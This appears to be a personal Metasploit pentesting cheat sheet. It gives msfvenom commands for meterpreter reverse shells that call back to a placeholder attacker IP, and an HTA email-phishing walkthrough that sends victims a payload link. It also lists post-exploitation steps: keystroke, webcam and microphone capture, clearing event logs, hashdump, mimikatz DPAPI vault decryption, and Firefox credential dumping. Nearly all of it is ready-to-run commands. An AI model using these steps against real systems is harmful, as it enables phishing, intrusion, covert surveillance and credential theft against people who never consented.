# Metasploit

## Catch a shell with meterpreter

### Generate shell with msfvenom:

`msfvenom --list payloads | grep meterpreter`

### List formats

`msfvenom --list formats`

### To generate payload take in account

- Target OS (Win, Linux, Mac)
- Language you need (Python, PHP, ...)
- Netwok connection types (TCP, HTTPS,...) 

### Cath the shell
`use exploit/multi/handler`
If you want meterpreter commands choose type of payload with meterpreter
Set `LHOST` and `LPORT` and `run` to catch the shell

### Meterpreter Commands
You can see this when typing `help`
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
```
Note: the commands can change depending on your version of meterpreter

#### Core commands

```
background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions (Kiwi for example)
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session
```

#### File system commands

```
cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory
```

#### Networking commands

```
arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table
System commands
clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS
```

#### Others Commands

```
idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database
```

### Example of shells

#### Using powershell

- Generate the script with `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK-MACHINE-IP LPORT=PORT -f psh -o shell.ps1`
- Serve it to the target with `python3 -m http.server port`
- Set up your listener on msfconsole `use multi/handler` `set payload windows/x64/meterpreter/reverse_tcp` set also LHOST and LPORT
- `exploit -j`
- run the exploit on the target you should have a shell
- list your sessions with `sessions`
- Interact with the desired session using `sessions -i number-of-session`

## HTA Email Phishing

### Create the payload with msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o payload.hta
```

### Set up metasploit

- `msfconsole`
- `use exploit/multi/handler`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set LHOST IP-OF-ATTACK-MACHINE`
- `set LPORT 443`
- `exploit -j`

### Host the file

- Launch this in the folder where the payload is `python3 -m http.server 80`

### Send the phishing email

- We can now send an email with a link to our reverse shell `http://IP-OF-ATTACK-MACHINE/name-of-your-script.hta`
- When the phishing receptient will execute the file we will get a reverse shell

### Catch your shell and interact

- In your metasploit shell launch `sessions`
- We should see a new meterpreter sessions from our taget machine
- To interact with it we can do `sessions -i number-of-session`

## Local Enumeration

- Let's suppose we have a shell
- We interact with it using `sessions -i number-of-session` (type `sessions` to list the available sessions)
- `sysinfo` will give info on win version, architecture etc
- `getuid` to have current user info
- `ipconfig` to get network info
- `arp` other information about network
- `netstat -ano` to get info on listener and other
- `ps to check processes
- `run post/windows/gather/enum_services` enumerate services
- `run post/windows/gather/enum_applications` enumerate applications
- `run post/windows/gather/enum_domains` enumerate domains (works better on msf5 than 6)
- `route` check out routes

## Dump hashes with Hashcat

- We should have a session
- We can check our privileges using `run post/windows/gather/win_privs`
- We can get getsystem if not already using `getsystem and to check it worked we can use `getuid`
- `hashdump` will dump the hashes on the machine *Note when the hash ends with `0c089c0` it usually means that the account is probably disabled`
- `load kiwi` will load mimikatz within meterpreter
- `creds_all`
- `lsa_dump_sam` will dump hashes from the sam file

## Cracking Credential Vault with mimikatz

- We should have a session (does not have to be admin, needs to be a domain user)
- We need to upload mimikatz on the target `upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe`
- `shell`
- `cd C:\Users\Public`
- `dir /a C:\users\user\appdata\local\microsoft\credentials`
- This will list the password files, we will use the smallest on which generally the one we need. 
- We launch mimikatz: `mimikatz.exe` 
- `vault::cred` will let us make sure that there are creds in the vault
- `dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\<CREDENTIAL-FILE-PREVIOUSLY-SELECTED>`
- We need to keep aside the guidMasterKey 
- `exit` to exit mimikatz
- `dir /a C:\users\user\appdata\roaming\microsoft\protect` and now we can keep note of the sid value that shoudl look like this: `03/07/2022  10:31 AM    <DIR>          S-1-5-21-3390063331-4123551052-1719781121-1113`
- `dir /a C:\users\user\appdata\roaming\microsoft\protect\S-1-5-21-3390063331-4123551052-1719781121-1113` the file with the guid should be the same guid of the guidMasterKey
- `dpapi::masterkey /in:C:\users\user\appdata\roaming\microsoft\protect\S-1-5-21-3390063331-4123551052-1719781121-1113\09770ae7-8e52-48cd-8899-45bb271132e7 /rpc` 
- this will output our masterkey value and should look like this: `key : 60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
- `cred /in:C:\users\user\appdata\local\microsoft\credentials\9FD43B9DAC2EECAA50270662B8E497D5 /masterkey:60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
- We will get the dc password in plaintext it should look like this:
  ```
  UserName       : domain\Administrator
  CredentialBlob : Password123!
  ```

## Dumping firefox credentials

- With an active shell session on metasploit
- `use post/multi/gather/firefox_creds`
- set SESSION to the ID of your active shell session
- `exploit`
- the files will be downloaded in the loot directory, it will be shown where to in the command line
- rename every file by checking their original name accordingly to: `key4.db`, `logins.json`, `cookies.sqlite`, `cert9.db`, `signons.sqlite`
- Download [firefox decrypt](https://github.com/unode/firefox_decrypt)
- And run it `python3 firefox_decrypt.py <msf loot directory>`
- You should see the decrypted credentials on the screen
